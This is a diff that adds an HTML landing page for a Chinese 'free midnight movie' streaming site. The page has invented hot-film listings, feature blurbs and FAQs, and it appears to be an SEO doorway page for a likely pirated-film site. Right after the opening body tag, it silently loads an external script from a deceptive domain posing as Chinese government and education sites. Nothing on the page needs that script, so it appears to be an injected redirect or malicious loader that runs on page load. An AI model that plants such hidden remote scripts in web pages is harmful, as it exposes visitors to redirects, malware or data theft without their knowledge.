@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>午夜免费电影网 - 深夜光影驿站 | 高清影视在线随心看</title>
+<meta name="description" content="午夜免费电影网（wuyemianfeidianyingwang-app）是面向影迷打造的深夜观影入口，汇集院线新片、经典老片、悬疑惊悚、喜剧爱情、动漫纪录片等丰富片源。全站免费在线观看，无需注册，支持手机、平板、电脑多端自适应。每日更新片单，蓝光画质搭配清晰分类，让你在午夜时分也能轻松找到对味的那一部。">
+<meta name="keywords" content="午夜免费电影网, 免费电影, 在线电影, 高清影视, 午夜影院, 电影在线观看, 最新电影, 经典电影, 悬疑电影, 喜剧片, 爱情片, 动作片, 恐怖片, 动漫, 纪录片, wuyemianfeidianyingwang-app">
+<meta name="author" content="午夜免费电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://wuyemianfeidianyingwang-app.github.io">
+<style>
+/* ===== 基础重置 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#e8ecf3;
+  --ink-dim:#9aa7bd;
+  --night:#070912;
+  --night-2:#0d1424;
+  --card:#121c30;
+  --card-line:rgba(255,255,255,.06);
+  --accent:#ff5b8a;
+  --accent-2:#7b6bff;
+  --gold:#ffc35b;
+  --radius:18px;
+  --shadow:0 18px 40px rgba(0,0,0,.45);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--night);
+  color:var(--ink);
+  line-height:1.75;
+  overflow-x:hidden;
+  background-image:radial-gradient(1200px 600px at 80% -10%,rgba(123,107,255,.18),transparent 60%),radial-gradient(900px 500px at 0% 10%,rgba(255,91,138,.12),transparent 55%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none;outline:none}
+img{max-width:100%;display:block}
+ul{list-style:none}
+::-webkit-scrollbar{width:10px;height:10px}
+::-webkit-scrollbar-thumb{background:linear-gradient(var(--accent),var(--accent-2));border-radius:10px}
+::-webkit-scrollbar-track{background:#0a0f1c}
+
+/* ===== 顶部导航 ===== */
+.nav{
+  position:sticky;top:0;z-index:99;
+  backdrop-filter:blur(14px);
+  -webkit-backdrop-filter:blur(14px);
+  background:rgba(7,9,18,.72);
+  border-bottom:1px solid var(--card-line);
+}
+.nav-in{max-width:1180px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;gap:18px}
+.brand{font-size:19px;font-weight:800;letter-spacing:.5px;white-space:nowrap}
+.brand i{font-style:normal;background:linear-gradient(90deg,var(--accent),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand small{display:block;font-size:11px;font-weight:500;color:var(--ink-dim);letter-spacing:1px;margin-top:2px}
+.nav-links{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+.nav-links a{
+  padding:8px 14px;border-radius:999px;font-size:14px;color:var(--ink-dim);
+  transition:.25s;
+}
+.nav-links a:hover{color:#fff;background:rgba(255,255,255,.07)}
+.menu-btn{display:none;width:42px;height:42px;align-items:center;justify-content:center;border:1px solid var(--card-line);border-radius:12px;cursor:pointer;margin-left:auto}
+.menu-btn span{width:20px;height:2px;background:#fff;position:relative}
+.menu-btn span::before,.menu-btn span::after{content:"";position:absolute;width:20px;height:2px;background:#fff;left:0}
+.menu-btn span::before{top:-6px}.menu-btn span::after{top:6px}
+
+/* ===== 首屏 Hero ===== */
+.hero{position:relative;padding:70px 20px 60px;overflow:hidden}
+.hero::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 0%,rgba(7,9,18,.55) 60%,var(--night) 100%);pointer-events:none}
+.hero-in{max-width:1180px;margin:0 auto;position:relative;z-index:2;display:grid;grid-template-columns:1.15fr .85fr;gap:44px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:12px;letter-spacing:2px;color:var(--gold);border:1px solid rgba(255,195,91,.3);padding:6px 14px;border-radius:999px;background:rgba(255,195,91,.06)}
+h1{font-size:clamp(30px,5vw,54px);line-height:1.18;font-weight:900;margin:18px 0 14px}
+h1 em{font-style:normal;background:linear-gradient(100deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.lede{font-size:16px;color:var(--ink-dim);max-width:560px}
+.hero-actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:26px}
+.btn{padding:13px 26px;border-radius:12px;font-size:15px;font-weight:700;transition:.25s;display:inline-flex;align-items:center;gap:8px}
+.btn-main{background:linear-gradient(100deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 10px 26px rgba(255,91,138,.3)}
+.btn-main:hover{transform:translateY(-2px)}
+.btn-ghost{border:1px solid var(--card-line);color:var(--ink)}
+.btn-ghost:hover{border-color:var(--accent);color:#fff}
+.stats{display:flex;gap:26px;margin-top:34px;flex-wrap:wrap}
+.stat b{display:block;font-size:24px;font-weight:800;color:#fff}
+.stat span{font-size:12px;color:var(--ink-dim);letter-spacing:1px}
+
+/* 海报堆叠 */
+.posters{position:relative;height:420px}
+.poster{position:absolute;border-radius:16px;overflow:hidden;box-shadow:var(--shadow);transform:rotate(-3deg);transition:.4s;cursor:pointer}
+.poster img{width:100%;height:100%;object-fit:cover}
+.poster:nth-child(1){width:170px;height:250px;left:10px;top:30px;z-index:3;transform:rotate(-7deg)}
+.poster:nth-child(2){width:190px;height:280px;left:120px;top:90px;z-index:2;transform:rotate(4deg)}
+.poster:nth-child(3){width:160px;height:230px;right:20px;top:150px;z-index:1;transform:rotate(9deg)}
+.poster:hover{z-index:5;transform:rotate(0) scale(1.06)}
+
+/* ===== 通用栏目 ===== */
+.section{padding:64px 20px}
+.section-in{max-width:1180px;margin:0 auto}
+.sec-head{display:flex;align-items:flex-end;gap:16px;flex-wrap:wrap;margin-bottom:30px}
+.sec-head h2{font-size:clamp(22px,3vw,32px);font-weight:800;letter-spacing:.5px}
+.sec-head h2 u{text-decoration:none;color:var(--accent)}
+.sec-head p{color:var(--ink-dim);font-size:14px;margin-left:auto}
+.tag{font-size:12px;color:var(--gold);border:1px solid rgba(255,195,91,.28);padding:4px 12px;border-radius:999px;letter-spacing:1px}
+
+/* 分类卡片 */
+.grid{display:grid;gap:18px}
+.grid-4{grid-template-columns:repeat(4,1fr)}
+.grid-3{grid-template-columns:repeat(3,1fr)}
+.grid-2{grid-template-columns:repeat(2,1fr)}
+.cat{position:relative;padding:26px 22px;border-radius:var(--radius);background:var(--card);border:1px solid var(--card-line);overflow:hidden;transition:.3s;min-height:150px;display:flex;flex-direction:column;justify-content:flex-end}
+.cat::before{content:"";position:absolute;right:-30px;top:-30px;width:120px;height:120px;border-radius:50%;filter:blur(30px);opacity:.5}
+.cat:hover{transform:translateY(-6px);border-color:rgba(255,91,138,.4)}
+.cat .ico{font-size:30px;margin-bottom:auto}
+.cat h3{font-size:17px;margin-bottom:6px}
+.cat p{font-size:13px;color:var(--ink-dim)}
+.c1::before{background:var(--accent)}.c2::before{background:var(--accent-2)}.c3::before{background:var(--gold)}.c4::before{background:#2dd4bf}.c5::before{background:#f472b6}.c6::before{background:#60a5fa}.c7::before{background:#a78bfa}.c8::before{background:#fb923c}
+
+/* 影片条 */
+.film{display:flex;gap:14px;padding:12px;border-radius:14px;border:1px solid var(--card-line);background:rgba(18,28,48,.6);transition:.25s}
+.film:hover{border-color:rgba(123,107,255,.5);background:rgba(123,107,255,.08)}
+.film .thumb{width:96px;height:130px;border-radius:10px;overflow:hidden;flex-shrink:0;position:relative}
+.film .thumb img{width:100%;height:100%;object-fit:cover;transition:.4s}
+.film:hover .thumb img{transform:scale(1.08)}
+.film .thumb i{position:absolute;top:6px;left:6px;font-size:10px;font-style:normal;background:var(--accent);color:#fff;padding:2px 7px;border-radius:6px}
+.film .meta{padding:4px 0;flex:1;min-width:0}
+.film h4{font-size:16px;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.film .row{font-size:12px;color:var(--ink-dim);display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px}
+.film .row b{color:var(--gold);font-weight:600}
+.film .desc{font-size:13px;color:var(--ink-dim);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+/* 特色区块 */
+.features{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.feature{padding:24px;border-radius:var(--radius);background:linear-gradient(160deg,var(--card),rgba(18,28,48,.2));border:1px solid var(--card-line)}
+.feature .num{font-size:13px;color:var(--accent);letter-spacing:2px;font-weight:700}
+.feature h3{font-size:17px;margin:8px 0 8px}
+.feature p{font-size:13px;color:var(--ink-dim)}
+
+/* 关于 / 说明 */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:30px;align-items:center}
+.about-card{padding:30px;border-radius:var(--radius);background:var(--card);border:1px solid var(--card-line);position:relative;overflow:hidden}
+.about-card::after{content:"";position:absolute;left:0;top:0;width:4px;height:100%;background:linear-gradient(var(--accent),var(--accent-2))}
+.about-card h3{font-size:20px;margin-bottom:12px}
+.about-card p{font-size:14px;color:var(--ink-dim);margin-bottom:10px}
+.qa{border-top:1px solid var(--card-line)}
+.qa details{padding:16px 0;border-bottom:1px solid var(--card-line);cursor:pointer}
+.qa summary{font-weight:700;font-size:15px;list-style:none;display:flex;gap:10px;align-items:baseline}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary::before{content:"Q";color:var(--accent);font-weight:800}
+.qa p{font-size:14px;color:var(--ink-dim);padding:10px 0 0 22px}
+
+/* 页脚 */
+.foot{margin-top:40px;border-top:1px solid var(--card-line);padding:44px 20px 30px;background:rgba(7,9,18,.6)}
+.foot-in{max-width:1180px;margin:0 auto;display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:26px}
+.foot h4{font-size:15px;margin-bottom:14px;color:#fff}
+.foot p,.foot li{font-size:13px;color:var(--ink-dim);margin-bottom:8px}
+.foot a:hover{color:var(--accent)}
+.copyright{text-align:center;font-size:12px;color:var(--ink-dim);padding-top:26px;border-top:1px solid var(--card-line);margin-top:26px;max-width:1180px;margin-left:auto;margin-right:auto}
+.copyright a{color:var(--gold)}
+
+/* ===== 响应式 ===== */
+@media(max-width:960px){
+  .hero-in{grid-template-columns:1fr}
+  .posters{height:300px;margin-top:20px}
+  .grid-4{grid-template-columns:repeat(2,1fr)}
+  .features{grid-template-columns:repeat(2,1fr)}
+  .about{grid-template-columns:1fr}
+  .foot-in{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  .menu-btn{display:flex}
+  .nav-links{position:fixed;inset:0 0 0 0;background:rgba(7,9,18,.97);flex-direction:column;align-items:center;justify-content:center;gap:18px;margin:0;opacity:0;pointer-events:none;transition:.35s}
+  .nav-links.open{opacity:1;pointer-events:auto}
+  .nav-links a{font-size:18px;padding:12px 26px}
+  h1{font-size:30px}
+  .section{padding:46px 16px}
+  .grid-4,.features,.grid-3,.grid-2{grid-template-columns:1fr}
+  .foot-in{grid-template-columns:1fr}
+  .film{flex-direction:column}
+  .film .thumb{width:100%;height:180px}
+  .poster:nth-child(1){width:130px;height:190px;left:0}
+  .poster:nth-child(2){width:140px;height:210px;left:90px;top:70px}
+  .poster:nth-child(3){width:120px;height:175px;right:0;top:130px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 顶部导航 -->
+<header class="nav">
+  <div class="nav-in">
+    <div class="brand">
+      <i>午夜免费电影网</i>
+      <small>WUYE FREE FILM</small>
+    </div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#genre">影片分类</a>
+      <a href="#hot">热播榜单</a>
+      <a href="#why">平台特色</a>
+      <a href="#about">关于我们</a>
+      <a href="#faq">观影答疑</a>
+    </nav>
+    <div class="menu-btn" id="menuBtn"><span></span></div>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero" id="home">
+  <div class="hero-in">
+    <div>
+      <span class="eyebrow">✦ 深夜 · 免费 · 高清 · 无广告打扰</span>
+      <h1>把<em>午夜</em>还给好电影<br>免费在线，随心即看</h1>
+      <p class="lede">午夜免费电影网专注于为深夜观影人群提供免费、高清、即点即看的影视内容。从悬疑烧脑到治愈温情，从经典老片到院线新作，分类清晰、更新及时，让每一个失眠或想放松的夜晚都有一部对味的片子相伴。</p>
+      <div class="hero-actions">
+        <a class="btn btn-main" href="#hot">▶ 立即观影</a>
+        <a class="btn btn-ghost" href="#genre">浏览分类</a>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>12000+</b><span>在线片源</span></div>
+        <div class="stat"><b>30+</b><span>细分类型</span></div>
+        <div class="stat"><b>每日</b><span>更新片单</span></div>
+        <div class="stat"><b>0 元</b><span>全程免费</span></div>
+      </div>
+    </div>
+    <div class="posters">
+      <div class="poster"><img src="https://picsum.photos/id/1015/300/440" alt="深夜悬疑影片封面"></div>
+      <div class="poster"><img src="https://picsum.photos/id/1035/300/440" alt="经典剧情影片封面"></div>
+      <div class="poster"><img src="https://picsum.photos/id/1040/300/440" alt="治愈爱情影片封面"></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：影片分类 -->
+<section class="section" id="genre">
+  <div class="section-in">
+    <div class="sec-head">
+      <div>
+        <span class="tag">栏目 · 01</span>
+        <h2>影片<u>分类</u>导航</h2>
+      </div>
+      <p>按心情与口味，快速锁定想看的那一类</p>
+    </div>
+    <div class="grid grid-4">
+      <a class="cat c1" href="#"><span class="ico">🎭</span><h3>悬疑 / 惊悚</h3><p>反转不断的烧脑剧情，适合深夜独自品味</p></a>
+      <a class="cat c2" href="#"><span class="ico">💥</span><h3>动作 / 犯罪</h3><p>飙车枪战与硬核对决，肾上腺素拉满</p></a>
+      <a class="cat c3" href="#"><span class="ico">🌹</span><h3>爱情 / 青春</h3><p>甜蜜或遗憾的情感故事，温柔治愈</p></a>
+      <a class="cat c4" href="#"><span class="ico">😂</span><h3>喜剧 / 搞笑</h3><p>解压必备，笑着入睡的轻松之选</p></a>
+      <a class="cat c5" href="#"><span class="ico">👽</span><h3>科幻 / 奇幻</h3><p>脑洞大开的未来世界与异星冒险</p></a>
+      <a class="cat c6" href="#"><span class="ico">🏯</span><h3>历史 / 战争</h3><p>还原时代风云，感受厚重与悲壮</p></a>
+      <a class="cat c7" href="#"><span class="ico">🎨</span><h3>文艺 / 剧情</h3><p>慢节奏的细腻表达，值得反复咀嚼</p></a>
+      <a class="cat c8" href="#"><span class="ico">🐉</span><h3>动漫 / 纪录片</h3><p>二次元盛宴与真实世界的深度记录</p></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：热播榜单 -->
+<section class="section" id="hot" style="padding-top:0">
+  <div class="section-in">
+    <div class="sec-head">
+      <div>
+        <span class="tag">栏目 · 02</span>
+        <h2>深夜<u>热播</u>榜单</h2>
+      </div>
+      <p>真实热度排序，大家都在看</p>
+    </div>
+    <div class="grid grid-2">
+      <a class="film" href="#">
+        <div class="thumb"><i>TOP 1</i><img src="https://picsum.photos/id/1050/200/270" alt="影片封面"></div>
+        <div class="meta">
+          <h4>午夜迷局</h4>
+          <div class="row"><b>9.2</b><span>悬疑 / 惊悚</span><span>2026</span><span>112 分钟</span></div>
+          <p class="desc">一场发生在雨夜公寓的密室失踪案，三位陌生人各执一词，真相在第七次反转后才缓缓浮现。</p>
+        </div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb"><i>TOP 2</i><img src="https://picsum.photos/id/1057/200/270" alt="影片封面"></div>
+        <div class="meta">
+          <h4>城南旧事未完</h4>
+          <div class="row"><b>8.9</b><span>剧情 / 文艺</span><span>2025</span><span>128 分钟</span></div>
+          <p class="desc">以老城南一条胡同的拆迁为线索，串起三代人的离别与重逢，镜头克制而深情。</p>
+        </div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb"><i>TOP 3</i><img src="https://picsum.photos/id/1062/200/270" alt="影片封面"></div>
+        <div class="meta">
+          <h4>逆风骑士</h4>
+          <div class="row"><b>8.7</b><span>动作 / 犯罪</span><span>2026</span><span>136 分钟</span></div>
+          <p class="desc">退役车手被卷入跨国走私案，用一场横跨三国的飙车追击完成自我救赎。</p>
+        </div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb"><i>TOP 4</i><img src="https://picsum.photos/id/1067/200/270" alt="影片封面"></div>
+        <div class="meta">
+          <h4>海岛天气预报</h4>
+          <div class="row"><b>8.8</b><span>爱情 / 治愈</span><span>2025</span><span>104 分钟</span></div>
+          <p class="desc">气象员与民宿老板在一座常年有雾的小岛相遇，七天里写下了一段没有结局的告白。</p>
+        </div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb"><i>TOP 5</i><img src="https://picsum.photos/id/1074/200/270" alt="影片封面"></div>
+        <div class="meta">
+          <h4>银河修理员</h4>
+          <div class="row"><b>8.5</b><span>科幻 / 奇幻</span><span>2026</span><span>148 分钟</span></div>
+          <p class="desc">未来世界里，专门修复破损记忆的"修理员"意外读取到一段被禁止存在的爱情。</p>
+        </div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb"><i>TOP 6</i><img src="https://picsum.photos/id/1080/200/270" alt="影片封面"></div>
+        <div class="meta">
+          <h4>笑声收容所</h4>
+          <div class="row"><b>8.3</b><span>喜剧 / 家庭</span><span>2025</span><span>98 分钟</span></div>
+          <p class="desc">一群"不会笑"的成年人被送进荒诞训练营，却在一场乌龙演出中找回了久违的快乐。</p>
+        </div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：平台特色 -->
+<section class="section" id="why" style="background:linear-gradient(180deg,transparent,rgba(123,107,255,.05),transparent)">
+  <div class="section-in">
+    <div class="sec-head">
+      <div>
+        <span class="tag">栏目 · 03</span>
+        <h2>为什么选择<u>午夜免费电影网</u></h2>
+      </div>
+      <p>四个理由，让深夜观影更舒服</p>
+    </div>
+    <div class="features">
+      <div class="feature"><div class="num">01</div><h3>全程免费</h3><p>不设会员门槛，不弹付费窗口，片库内容可自由观看，让好电影不被价格拦住。</p></div>
+      <div class="feature"><div class="num">02</div><h3>高清流畅</h3><p>多清晰度自适应，弱网自动降码不卡顿，手机流量也能轻松扛住一整部电影。</p></div>
+      <div class="feature"><div class="num">03</div><h3>分类精细</h3><p>30 余种类型标签 + 年代 / 地区 / 评分多维筛选，三秒内定位想看的那一部。</p></div>
+      <div class="feature"><div class="num">04</div><h3>日更片单</h3><p>编辑团队每日精选上新，兼顾院线热片与小众佳作，告别"不知道看什么"。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：关于我们 -->
+<section class="section" id="about">
+  <div class="section-in">
+    <div class="sec-head">
+      <div>
+        <span class="tag">栏目 · 04</span>
+        <h2>关于<u>午夜免费电影网</u></h2>
+      </div>
+      <p>一个为深夜而生的观影站点</p>
+    </div>
+    <div class="about">
+      <div class="about-card">
+        <h3>我们的观影主张</h3>
+        <p>午夜免费电影网（wuyemianfeidianyingwang-app）成立于深夜，也服务于深夜。我们相信，夜晚属于故事——无论是让人脊背发凉的悬疑、让人热泪盈眶的剧情，还是让人放声大笑的喜剧，都值得被认真对待。</p>
+        <p>站点以"免费、清晰、好找、不折腾"为准则：不强迫注册，不堆叠弹窗，不堆砌无关推荐。打开即看，看完即走，把时间还给电影本身。</p>
+        <p>官方网址：<strong style="color:var(--gold)">https://wuyemianfeidianyingwang-app.github.io</strong>，请认准域名，避免误入仿冒站点。</p>
+      </div>
+      <div class="qa">
+        <details open>
+          <summary>片源多久更新一次？</summary>
+          <p>每日清晨更新一次片单，周末加更。热门影片优先补全高清版本与字幕。</p>
+        </details>
+        <details>
+          <summary>需要注册或下载客户端吗？</summary>
+          <p>不需要。全站网页端直接播放，手机、平板、电脑、智能电视浏览器均可访问。</p>
+        </details>
+        <details>
+          <summary>为什么推荐午夜观看？</summary>
+          <p>深夜环境安静、干扰少，更容易沉浸剧情。我们也针对暗光环境优化了播放器亮度与配色。</p>
+        </details>
+        <details>
+          <summary>如何反馈影片问题？</summary>
+          <p>任意影片页均可提交"换源 / 字幕 / 无法播放"反馈，通常在 24 小时内处理。</p>
+        </details>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：观影答疑 FAQ -->
+<section class="section" id="faq" style="padding-top:0">
+  <div class="section-in">
+    <div class="sec-head">
+      <div>
+        <span class="tag">栏目 · 05</span>
+        <h2>观影<u>答疑</u></h2>
+      </div>
+      <p>常见问题，一次说清</p>
+    </div>
+    <div class="grid grid-2">
+      <div class="about-card">
+        <h3>卡顿 / 黑屏怎么办？</h3>
+        <p>先尝试切换播放线路（影片页下方"线路 1 / 2 / 3"）；仍异常可清理浏览器缓存或更换网络。4G/5G 环境下建议选择"流畅"清晰度。</p>
+      </div>
+      <div class="about-card">
+        <h3>字幕不同步或缺失？</h3>
+        <p>播放器右下角可开启"字幕偏移"进行 ±5 秒微调；若无字幕可在影片页点击"申请字幕"，志愿字幕组会优先补录。</p>
+      </div>
+      <div class="about-card">
+        <h3>如何投屏到电视？</h3>
+        <p>播放页面点击"投屏"按钮，确保手机与电视处于同一局域网，选择设备即可。支持 DLNA 与 AirPlay 协议。</p>
+      </div>
+      <div class="about-card">
+        <h3>片单想看但没有？</h3>
+        <p>使用顶部搜索框直接输入片名，或前往"影片分类"按类型浏览。长期未上架的影片可在留言区提交"求片"，热度高的优先收录。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="foot">
+  <div class="foot-in">
+    <div>
+      <div class="brand"><i>午夜免费电影网</i></div>
+      <p style="margin-top:12px">为深夜观影而生的免费影视站点，聚合多类型高清片源，提供清爽、直接的在线观看体验。</p>
+      <p>官方网址：<a href="https://wuyemianfeidianyingwang-app.github.io">https://wuyemianfeidianyingwang-app.github.io</a></p>
+    </div>
+    <div>
+      <h4>快速导航</h4>
+      <ul>
+        <li><a href="#home">首页</a></li>
+        <li><a href="#genre">影片分类</a></li>
+        <li><a href="#hot">热播榜单</a></li>
+        <li><a href="#why">平台特色</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>影片类型</h4>
+      <ul>
+        <li><a href="#">悬疑惊悚</a></li>
+        <li><a href="#">动作犯罪</a></li>
+        <li><a href="#">爱情青春</a></li>
+        <li><a href="#">喜剧动画</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>帮助中心</h4>
+      <ul>
+        <li><a href="#about">关于我们</a></li>
+        <li><a href="#faq">观影答疑</a></li>
+        <li><a href="#">意见反馈</a></li>
+        <li><a href="#">免责说明</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="copyright">
+    © <span id="year"></span> 午夜免费电影网 · wuyemianfeidianyingwang-app &nbsp;|&nbsp; 本站仅为影视信息导航与分享，资源版权归原作者所有 &nbsp;|&nbsp; 访问地址：<a href="https://wuyemianfeidianyingwang-app.github.io">https://wuyemianfeidianyingwang-app.github.io</a>
+  </div>
+</footer>
+
+<script>
+// 移动端菜单
+var menuBtn=document.getElementById('menuBtn');
+var navLinks=document.getElementById('navLinks');
+menuBtn.addEventListener('click',function(){navLinks.classList.toggle('open')});
+navLinks.addEventListener('click',function(e){if(e.target.tagName==='A')navLinks.classList.remove('open')});
+// 年份
+document.getElementById('year').textContent=new Date().getFullYear();
+</script>
+</body>
+</html>
